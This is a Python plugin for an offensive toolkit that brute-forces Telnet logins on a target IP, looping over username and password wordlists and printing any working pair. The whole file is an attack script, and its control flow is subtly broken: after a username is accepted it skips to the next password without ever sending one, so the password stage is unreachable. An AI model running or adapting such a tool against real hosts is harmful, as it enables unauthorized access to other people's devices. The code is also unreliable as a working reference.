import subprocess
import smf

from apps.utility.colors import CC
from lib.roar.calling import call_bin

metadata = {
    "Name": "Bruteforce Telnet login",
    "Description": """
Matching Telnet login username and password
to find out if a Telnet is using standard login auth.
Using 2 test stages, the first with standard auth
The second stage uses the custom keyword.
""",
    "Author": ["zxelzy"],
    "Action": [
        ["Bruteforce", {"Description": "Bypass Telnet login"}],
    ],
    "DefaultAction": "Bruteforce",
    "License": "SMF License",
    "Date": "2025-08-19",
}

SYM_SUCCESS = "🔑"
SYM_FAILED = "🔒"

REQUIRED_OPTIONS = {
    "IP": "",
    "PASS": "fill with wordlist password",
    "USER": "fill with wordlist username",
}


def execute(options, net):
    # Ambil parameter dari dictionary
    ip = options.get("IP")
    port = 23
    user_list = options.get("USER")      # bisa list atau string tunggal
    pass_list = options.get("PASS")      # bisa list atau string tunggal

    # Pastikan berbentuk list
    if isinstance(user_list, str):
        user_list = [user_list]
    if isinstance(pass_list, str):
        pass_list = [pass_list]

    # Prompt yang umum ditemui
    promt_login = ["login:", "Login:"]
    promt_pass   = ["password:", "pass:", "Password:", "Pass:"]
    promt_shell  = [
        "$", "#", ">", "%",
        "welcome", "last login",
        "password changed", "press enter"
    ]

    smf.printf(f"{CC.CYAN}[*] Starting Telnet Bruteforce => {ip}:23{CC.RESET}\n\n")

    success = False

    for user in user_list:
        for password in pass_list:
            con = None
            try:
                # Buka koneksi baru
                con = net.telnet(ip, port)

                # Tunggu prompt login, kirim username
                _, res = con.read(expected=promt_login)
                if res < 0:
                    smf.printf(f"{CC.YELLOW}[!] Failed to get login prompt for {user}{CC.RESET}")
                    return # Keluar jika promt tidak di temukan

                # Kirim username, tunggu prompt password
                _, r = con.send(user, expected=promt_pass)
                if r < 0:
                    smf.printf(f"{CC.YELLOW}[*] U:{user} {SYM_FAILED}{CC.RESET}")
                    break

                if r >= 0:
                    smf.printf(f"{CC.GREEN}[✓] U:{user} {SYM_SUCCESS}{CC.RESET}\n")
                    continue

                # Kirim password, tunggu prompt shell
                _, r = con.send(password, expected=promt_shell)
                if r < 0:
                    smf.printf(f"{CC.YELLOW}[*] P:{password} {SYM_FAILED}{CC.RESET}")
                    break
                
                if r >= 0:
                    # Berhasil login!
                    smf.printf(f"{CC.GREEN}[✓] Bruteforce successful. U={user}:P={password} {SYM_SUCCESS}{CC.RESET}\n")
                    success = True
                    return

            except KeyboardInterrupt:
                smf.printf(f"\n{CC.YELLOW}[*] Proxy stopped by user.{CC.RESET}")
            except Exception as e:
                smf.printf(f"\n{CC.RED}[!] Error in the experiment =>{CC.RESET} {user}:{password}")
                smf.printd("Exception Telnet Bruteforce", e, level="ERROR")
            finally:
                if con:
                    con.close()

    if not success:
        smf.printf(f"{CC.YELLOW}[!] Bruteforce failed, no valid combination found.{CC.RESET}")

    smf.printf(f"{CC.GREEN}[*] Telnet brute daemon successfully stopped and cleaned up.{CC.RESET}")
